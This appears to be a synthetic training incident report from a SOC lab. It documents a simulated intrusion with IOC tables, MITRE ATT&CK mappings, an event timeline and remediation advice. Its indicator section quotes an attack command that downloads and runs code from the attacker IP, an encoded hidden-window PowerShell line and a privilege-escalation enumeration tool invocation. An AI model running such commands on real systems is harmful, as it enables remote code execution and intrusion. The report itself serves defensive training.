# Digital Forensics & Incident Report — CASE-20260617-0855

> **CLASSIFICATION: UNCLASSIFIED // FOR TRAINING USE**  
> Cyber Defense SOC Lab — synthetic data, generated for demonstration.

| Field | Value |
|---|---|
| Case ID | `CASE-20260617-0855` |
| Lead Analyst | SOC Analyst — Tier 2 |
| Report Generated | 2026-06-17 08:55:15 UTC |
| Events Analysed | 57 |
| Alerts Triaged | 7 |
| Severity Breakdown | CRIT 2 / HIGH 3 / MED 2 / LOW 0 |

## 1. Executive Summary

During the monitoring period the SOC detection pipeline triaged **7 alerts** across **57 normalised events**. The activity is consistent with a multi-stage intrusion: credential access (password spraying), discovery (network scanning), execution (obfuscated PowerShell), privilege escalation, and a malware delivery attempt. The leading source of malicious activity was `10.10.20.66`.

## 2. Indicators of Compromise (IOCs)

### Suspicious source IPs
| IP | Event count |
|---|---|
| `10.10.20.66` | 31 |
| `10.10.20.30` | 7 |
| `10.10.20.31` | 4 |
| `10.10.10.50` | 3 |
| `10.10.10.20` | 2 |
| `10.10.10.10` | 1 |

### Accounts involved
| Account | Event count |
|---|---|
| `t.brown` | 8 |
| `j.doe` | 5 |
| `administrator` | 4 |
| `l.garcia` | 3 |
| `r.patel` | 3 |
| `m.khan` | 3 |
| `a.smith` | 3 |
| `root` | 3 |
| `s.nguyen` | 2 |
| `svc_backup` | 1 |

### Affected hosts
| Host | Event count |
|---|---|
| `WIN-DC01` | 12 |
| `WIN-CLIENT01` | 9 |
| `WIN-CLIENT02` | 5 |
| `WIN-SIEM` | 4 |
| `LNX-WEB01` | 3 |
| `WIN-SRV02` | 2 |

### File artefacts & hashes
- `C:\Users\t.brown\AppData\Local\Temp\invoice_2025.exe`
  - SHA-256 `275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f`

### Suspicious command lines
- `winPEAS.exe quiet`
- `IEX (New-Object Net.WebClient).DownloadString('http://10.10.20.66/a')`
- `powershell.exe -nop -w hidden - exec bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHI`

## 3. MITRE ATT&CK Techniques Observed

| Technique | Alert hits |
|---|---|
| T1105 Ingress Tool Transfer | 3 |
| T1204 User Execution | 2 |
| T1059 Command & Scripting | 2 |
| T1078 Valid Accounts | 1 |
| T1548 Abuse Elevation Control | 1 |
| T1059.001 PowerShell | 1 |
| T1027 Obfuscated Files | 1 |
| T1046 Network Service Discovery | 1 |
| T1595 Active Scanning | 1 |
| T1110 Brute Force | 1 |
| T1110.001 Brute Force | 1 |
| T1110.003 Password Spraying | 1 |

## 4. Alert Detail

| Time (UTC) | Sev | Rule | Host | Summary |
|---|---|---|---|---|
| 2026-06-17T08:55:15 | HIGH | SOC-001 | WIN-DC01 | 5 failed authentications from 10.10.20.66 across 5 accounts within 60s |
| 2026-06-17T08:55:15 | MEDIUM | SOC-006 | WIN-DC01 | 3 failed logins targeting account 'administrator' within 120s |
| 2026-06-17T08:55:15 | MEDIUM | SOC-002 | 10.10.10.20 | 15 connection attempts to 15 distinct ports on 10.10.10.20 from 10.10.20.66 |
| 2026-06-17T08:55:15 | HIGH | SOC-004 | WIN-CLIENT01 | Suspicious PowerShell on WIN-CLIENT01 by t.brown: powershell.exe -nop -w hidden - exec bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAI |
| 2026-06-17T08:55:15 | HIGH | SOC-003 | WIN-CLIENT01 | Special privileges (SeDebugPrivilege, SeTcbPrivilege, SeImpersonatePrivilege) assigned to svc_backup on WIN-CLIENT01 |
| 2026-06-17T08:55:15 | CRITICAL | SOC-005 | WIN-CLIENT01 | Malware indicator 'EICAR-Test-File' on WIN-CLIENT01 (t.brown) |
| 2026-06-17T08:55:15 | CRITICAL | SOC-005 | WIN-CLIENT01 | Malware indicator 'EICAR-Test-File' on WIN-CLIENT01 (t.brown) |

## 5. Investigation Timeline (latest 40 entries)

| Time | Type | Source | Host | User | Detail |
|---|---|---|---|---|---|
| 2026-06-17T08:55:11 | event | WinEventLog:Security | WIN-DC01 | t.brown | An account was successfully logged on (t.brown) — spray hit. |
| 2026-06-17T08:55:11 | event | WinEventLog:Sysmon | WIN-CLIENT01 | t.brown | Process create: powershell.exe (encoded, hidden window). |
| 2026-06-17T08:55:12 | event | Firewall:flow | 10.10.10.20 | n/a | SYN scan probe to 10.10.10.20:3306 |
| 2026-06-17T08:55:12 | event | Firewall:flow | 10.10.10.20 | n/a | SYN scan probe to 10.10.10.20:3389 |
| 2026-06-17T08:55:12 | event | Firewall:flow | 10.10.10.20 | n/a | SYN scan probe to 10.10.10.20:5985 |
| 2026-06-17T08:55:12 | event | WinEventLog:PowerShell | WIN-CLIENT01 | t.brown | ScriptBlock logging: download cradle via Invoke-Expression. |
| 2026-06-17T08:55:12 | event | Firewall:flow | 10.10.10.20 | n/a | SYN scan probe to 10.10.10.20:5986 |
| 2026-06-17T08:55:12 | event | Firewall:flow | 10.10.10.20 | n/a | SYN scan probe to 10.10.10.20:8080 |
| 2026-06-17T08:55:12 | event | Firewall:flow | 10.10.10.20 | n/a | SYN scan probe to 10.10.10.20:8443 |
| 2026-06-17T08:55:12 | event | WinEventLog:Sysmon | WIN-CLIENT01 | t.brown | Process create: local privilege-escalation enumeration tool. |
| 2026-06-17T08:55:13 | event | WinEventLog:Security | WIN-CLIENT01 | svc_backup | Special privileges assigned to new logon (svc_backup). |
| 2026-06-17T08:55:13 | event | WinEventLog:Sysmon | WIN-CLIENT01 | t.brown | File create: C:\Users\t.brown\AppData\Local\Temp\invoice_2025.exe (matches EICAR test sign |
| 2026-06-17T08:55:14 | event | EDR:alert | WIN-CLIENT01 | t.brown | Malware signature EICAR-Test-File detected and quarantined. |
| 2026-06-17T08:55:15 | event | WinEventLog:Sysmon | WIN-CLIENT02 | r.patel | Process created: C:\Program Files\Microsoft Office\winword.exe |
| 2026-06-17T08:55:15 | event | WinEventLog:Security | WIN-SIEM | j.doe | An account was successfully logged on (j.doe). |
| 2026-06-17T08:55:15 | event | WinEventLog:Security | WIN-DC01 | a.smith | An account was successfully logged on (a.smith). |
| 2026-06-17T08:55:15 | event | WinEventLog:Security | WIN-CLIENT01 | j.doe | An account was successfully logged on (j.doe). |
| 2026-06-17T08:55:15 | event | WinEventLog:Security | WIN-SRV02 | l.garcia | An account was successfully logged on (l.garcia). |
| 2026-06-17T08:55:15 | event | WinEventLog:Security | WIN-SIEM | administrator | An account was successfully logged on (administrator). |
| 2026-06-17T08:55:15 | event | WinEventLog:Security | WIN-SRV02 | j.doe | An account was successfully logged on (j.doe). |
| 2026-06-17T08:55:15 | event | WinEventLog:Security | WIN-CLIENT01 | m.khan | An account was successfully logged on (m.khan). |
| 2026-06-17T08:55:15 | event | WinEventLog:Security | WIN-SIEM | r.patel | An account was successfully logged on (r.patel). |
| 2026-06-17T08:55:15 | event | Linux:auth | LNX-WEB01 | root | Accepted password for root from 10.10.20.30 port 51022 ssh2 |
| 2026-06-17T08:55:15 | event | Firewall:flow | 10.10.20.31 | n/a | Allowed established connection. |
| 2026-06-17T08:55:15 | event | Linux:auth | LNX-WEB01 | root | Accepted password for root from 10.10.20.30 port 51022 ssh2 |
| 2026-06-17T08:55:15 | event | Firewall:flow | 10.10.10.40 | n/a | Allowed established connection. |
| 2026-06-17T08:55:15 | event | WinEventLog:Sysmon | WIN-CLIENT01 | t.brown | Process created: C:\Windows\explorer.exe |
| 2026-06-17T08:55:15 | event | WinEventLog:Sysmon | WIN-CLIENT02 | j.doe | Process created: C:\Program Files\Microsoft Office\winword.exe |
| 2026-06-17T08:55:15 | event | Linux:auth | LNX-WEB01 | root | Accepted password for root from 10.10.20.30 port 51022 ssh2 |
| 2026-06-17T08:55:15 | event | WinEventLog:Security | WIN-CLIENT02 | m.khan | An account was successfully logged on (m.khan). |
| 2026-06-17T08:55:15 | event | WinEventLog:Sysmon | WIN-SIEM | l.garcia | Process created: C:\Program Files\Google\Chrome\Application\chrome.exe |
| 2026-06-17T08:55:15 | event | WinEventLog:Security | WIN-CLIENT02 | a.smith | An account was successfully logged on (a.smith). |
| 2026-06-17T08:55:15 | event | WinEventLog:Security | WIN-CLIENT02 | s.nguyen | An account was successfully logged on (s.nguyen). |
| 2026-06-17T08:55:15 | ALERT | SOC-001 | WIN-DC01 | s.nguyen | [HIGH] 5 failed authentications from 10.10.20.66 across 5 accounts within 60s |
| 2026-06-17T08:55:15 | ALERT | SOC-006 | WIN-DC01 | administrator | [MEDIUM] 3 failed logins targeting account 'administrator' within 120s |
| 2026-06-17T08:55:15 | ALERT | SOC-002 | 10.10.10.20 | n/a | [MEDIUM] 15 connection attempts to 15 distinct ports on 10.10.10.20 from 10.10.20.66 |
| 2026-06-17T08:55:15 | ALERT | SOC-004 | WIN-CLIENT01 | t.brown | [HIGH] Suspicious PowerShell on WIN-CLIENT01 by t.brown: powershell.exe -nop -w hidden - e |
| 2026-06-17T08:55:15 | ALERT | SOC-003 | WIN-CLIENT01 | svc_backup | [HIGH] Special privileges (SeDebugPrivilege, SeTcbPrivilege, SeImpersonatePrivilege) assig |
| 2026-06-17T08:55:15 | ALERT | SOC-005 | WIN-CLIENT01 | t.brown | [CRITICAL] Malware indicator 'EICAR-Test-File' on WIN-CLIENT01 (t.brown) |
| 2026-06-17T08:55:15 | ALERT | SOC-005 | WIN-CLIENT01 | t.brown | [CRITICAL] Malware indicator 'EICAR-Test-File' on WIN-CLIENT01 (t.brown) |

## 6. Chain of Custody

| Evidence ID | Description | SHA-256 | Collected By | Collected At | Status |
|---|---|---|---|---|---|
| CASE-20260617-0855-001 | Raw event log (JSONL) | `a52f87f46b60d994…` | SOC Analyst — Tier 2 | 2026-06-17T08:55:15 | sealed |
| CASE-20260617-0855-002 | Alert log (JSONL) | `dcd9552d96badb47…` | SOC Analyst — Tier 2 | 2026-06-17T08:55:15 | sealed |

## 7. Findings & Recommendations

1. **Containment** — block the identified source IP(s) at the perimeter and isolate affected workstations from the network.
2. **Credential hygiene** — force password resets for every account that appeared in failed-logon clusters; enforce MFA on all remote access.
3. **Privilege review** — remove excess token privileges (SeDebug/SeImpersonate) from non-tier-0 service accounts.
4. **Hardening** — enable PowerShell ScriptBlock + Module logging estate-wide; deploy the provided Sysmon config to all endpoints.
5. **Detection tuning** — promote the validated lab rules into the production Wazuh ruleset; add the observed IOCs to threat-intel watchlists.

---
*Report produced by the Cyber Defense SOC Lab forensics module on 2026-06-17 08:55:15 UTC. All data is synthetic and generated for training.*